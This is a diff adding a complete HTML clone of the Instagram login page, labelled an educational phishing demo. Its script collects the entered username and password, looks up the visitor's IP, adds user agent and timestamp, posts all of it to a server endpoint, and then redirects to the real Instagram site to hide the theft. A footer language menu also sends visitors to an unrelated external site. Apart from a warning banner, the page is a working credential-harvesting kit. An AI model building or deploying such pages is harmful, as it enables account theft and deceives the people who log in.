@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram Login Simulator (Educational Demo)</title>
+  <style>
+    u, ul, var, video { margin: 0; padding: 0; border: 0; font: inherit; vertical-align: baseline; }
+    a, a:visited { text-decoration: none; }
+    a:active, .btn:active { opacity: 0.5; }
+    ol, ul { list-style: none; }
+    body, button, input {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      font-size: 14px; line-height: 18px;
+    }
+    #root, article, main, div, section, header, nav, footer {
+      border: 0 solid #000000;
+      box-sizing: border-box;
+      align-items: stretch;
+      display: flex;
+      flex-direction: column;
+      flex-shrink: 0;
+      margin: 0;
+      padding: 0;
+      position: relative;
+    }
+    #root { z-index: 0; }
+    .section-all { min-height: 100%; overflow: hidden; }
+    .main { background-color: #fafafa; order: 4; flex-grow: 1; }
+    .wrapper { min-height: 100%; overflow: hidden; }
+    .wrapper, .article {
+      flex-grow: 1; justify-content: center;
+    }
+    .article {
+      flex-direction: row;
+      margin: 0 auto;
+      max-width: 935px;
+      width: 100%;
+    }
+    .content {
+      color: #262626;
+      flex-grow: 1;
+      justify-content: center;
+      max-width: 350px;
+      margin-top: 12px;
+    }
+    .login-box {
+      background: #fff;
+      border: 1px solid #e6e6e6;
+      border-radius: 1px;
+      margin: 0 0 10px;
+      padding: 10px 0;
+    }
+    .header { margin: 14.45px auto 12px; }
+    .logo {
+      background: cover no-repeat;
+      width: 175px;
+      height: auto;
+    }
+    .form { display: flex; flex-direction: column; margin-bottom: 10px; }
+    .input-box { margin: auto 40px 6px; }
+    input {
+      height: 36px;
+      border: 1px solid #efefef;
+      border-radius: 3px;
+      background-color: #fafafa;
+      width: 100%;
+      font-size: 12px;
+      padding: 9px 0 7px 8px;
+      outline: none;
+      box-sizing: border-box;
+    }
+    input#name:focus, input#password:focus { border-color: #bbb; }
+    .button-box {
+      display: block;
+      position: relative;
+      margin: 8px 40px;
+    }
+    .btn {
+      cursor: pointer;
+      width: 100%;
+      background: #3897f0;
+      border: 1px solid #3897f0;
+      color: #fff;
+      border-radius: 3px;
+      font-weight: 600;
+      font-size: 14px;
+      height: 28px;
+      line-height: 26px;
+    }
+    .forgot {
+      font-size: 12px;
+      margin-top: 12px;
+      text-align: center;
+      color: #003569;
+      line-height: 14px !important;
+    }
+    .text {
+      text-align: center;
+      margin: 15px;
+      color: #262626;
+      font-size: 14px;
+    }
+    .text a { color: #3897f0; margin-left: 3px; }
+    .app p {
+      line-height: 18px;
+      color: #262626;
+      font-size: 14px;
+      text-align: center;
+      margin: 10px 20px;
+    }
+    .app-img {
+      flex-direction: row;
+      justify-content: center;
+      margin: 10px 0;
+      display: flex;
+    }
+    .app-img a { margin-right: 8px; height: 43.5px; }
+    .app-img img { height: 40px; }
+    .footer {
+      background-color: #fafafa;
+      order: 5;
+      padding: 0 20px;
+    }
+    .footer-container {
+      flex-direction: row;
+      flex-wrap: wrap;
+      justify-content: space-between;
+      padding: 38px 0;
+      max-width: 935px;
+      font-size: 12px;
+      font-weight: 600;
+      margin: 0 auto;
+      text-transform: uppercase;
+      width: 100%;
+      display: flex;
+    }
+    .footer-nav ul {
+      margin-right: 16px;
+      margin-bottom: 3px;
+      flex-grow: 1;
+    }
+    .footer-nav ul li {
+      display: inline-block;
+      margin-right: 13px;
+      margin-bottom: 7px;
+    }
+    .footer-nav ul li a {
+      color: #003569;
+      text-decoration: none;
+    }
+    .footer span { color: #999; }
+    span.language {
+      color: #003569;
+      cursor: pointer;
+      display: inline-block;
+      font-weight: 600;
+      position: relative;
+      text-transform: uppercase;
+    }
+    .select {
+      cursor: pointer;
+      height: 100%;
+      top: 0;
+      opacity: 0;
+      position: absolute;
+      left: 0;
+      width: 100%;
+    }
+    .warning {
+      font-size: 12px;
+      color: #b91c1c;
+      text-align: center;
+      margin: 10px 40px;
+      font-weight: bold;
+    }
+    #msg {
+      color: #b91c1c;
+      font-size: 12px;
+      text-align: center;
+      min-height: 20px;
+      margin: 10px 40px;
+    }
+    @media (max-width: 450px) {
+      .main { background-color: #fff; }
+      .content {
+        max-width: 100%;
+        margin-top: 0;
+        justify-content: space-between;
+      }
+      .login-box { background-color: transparent; border: none; }
+    }
+    @media only screen and (max-width: 875px) {
+      .footer-container {
+        text-align: center;
+        padding: 10px 0;
+        justify-content: center;
+      }
+    }
+  </style>
+</head>
+<body>
+  <span id="root">
+    <section class="section-all">
+      <main class="main" role="main">
+        <div class="wrapper">
+          <article class="article">
+            <div class="content">
+              <div class="login-box">
+                <div class="header">
+                  <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram">
+                </div>
+                <div class="form-wrap">
+                  <form class="form" id="loginForm">
+                    <div class="input-box">
+                      <input type="text" id="name" placeholder="Phone number, username, or email" maxlength="30" autocapitalize="off" autocorrect="off" name="username" required>
+                    </div>
+                    <div class="input-box">
+                      <input type="password" name="password" id="password" placeholder="Password" maxlength="30" autocapitalize="off" autocorrect="off" required>
+                    </div>
+                    <span class="button-box">
+                      <button class="btn" type="submit" name="submit">Log in</button>
+                    </span>
+                    <p id="msg"></p>
+                    <p class="warning">⚠️ Educational Demo Only: Do not enter real Instagram credentials. This is a classroom exercise to demonstrate phishing risks.</p>
+                    <a class="forgot" href="#">Forgot password?</a>
+                  </form>
+                </div>
+              </div>
+              <div class="login-box">
+                <p class="text">Don't have an account?<a href="#">Sign up</a></p>
+              </div>
+              <div class="app">
+                <p>Get the app.</p>
+                <div class="app-img">
+                  <a href="https://itunes.apple.com/app/instagram/id389801252">
+                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/4b70f6fae447.png" alt="iOS">
+                  </a>
+                  <a href="https://play.google.com/store/apps/details?id=com.instagram.android">
+                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/f06b908907d5.png" alt="Android">
+                  </a>
+                </div>
+              </div>
+            </div>
+          </article>
+        </div>
+      </main>
+      <footer class="footer" role="contentinfo">
+        <div class="footer-container">
+          <nav class="footer-nav" role="navigation">
+            <ul>
+              <li><a href="#">About Us</a></li>
+              <li><a href="#">Support</a></li>
+              <li><a href="#">Blog</a></li>
+              <li><a href="#">Press</a></li>
+              <li><a href="#">API</a></li>
+              <li><a href="#">Jobs</a></li>
+              <li><a href="#">Privacy</a></li>
+              <li><a href="#">Terms</a></li>
+              <li><a href="#">Directory</a></li>
+              <li>
+                <span class="language">Language
+                  <select name="language" class="select" onchange="la(this.value)">
+                    <option value="#">English</option>
+                    <option value="http://ru-instafollow.bitballoon.com">Russian</option>
+                  </select>
+                </span>
+              </li>
+            </ul>
+          </nav>
+          <span class="footer-logo">© 2025 Instagram (Educational Demo)</span>
+        </div>
+      </footer>
+    </section>
+  </span>
+  <script>
+    function la(src) {
+      if (src && src !== "#") {
+        window.location = src;
+      }
+    }
+
+    document.getElementById("loginForm").addEventListener("submit", async function(e) {
+      e.preventDefault();
+      const msgElement = document.getElementById("msg");
+      const username = document.getElementById("name").value.trim();
+      const password = document.getElementById("password").value;
+
+      if (!username || !password) {
+        msgElement.innerHTML = "Please fill all fields.";
+        return;
+      }
+
+      try {
+        // Fetch IP address
+        let ip = "Unknown";
+        try {
+          const ipResponse = await fetch("https://ipinfo.io/json", { timeout: 5000 });
+          if (!ipResponse.ok) throw new Error("IP fetch failed");
+          const ipData = await ipResponse.json();
+          ip = ipData.ip || "Unknown";
+        } catch (ipError) {
+          console.warn("IP fetch error:", ipError);
+        }
+
+        // Collect device info
+        const userAgent = navigator.userAgent || "Unknown";
+        const timestamp = new Date().toISOString();
+
+        // Prepare message
+        const message = `
+📥 Phishing Demo Submission
+👤 Username: ${username}
+🔑 Password: ${password}
+🌐 IP Address: ${ip}
+📱 User-Agent: ${userAgent}
+⏰ Timestamp: ${timestamp}
+        `.trim();
+
+        // Send to server
+        const response = await fetch("/submit", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ message })
+        });
+
+        if (response.ok) {
+          msgElement.innerHTML = "Data submitted for demo. Redirecting...";
+          setTimeout(() => {
+            window.location.href = "https://www.instagram.com";
+          }, 1000);
+        } else {
+          msgElement.innerHTML = "Error sending data to server.";
+        }
+      } catch (error) {
+        msgElement.innerHTML = "Network or server error occurred.";
+        console.error("Submission error:", error);
+      }
+    });
+  </script>
+</body>
+</html>
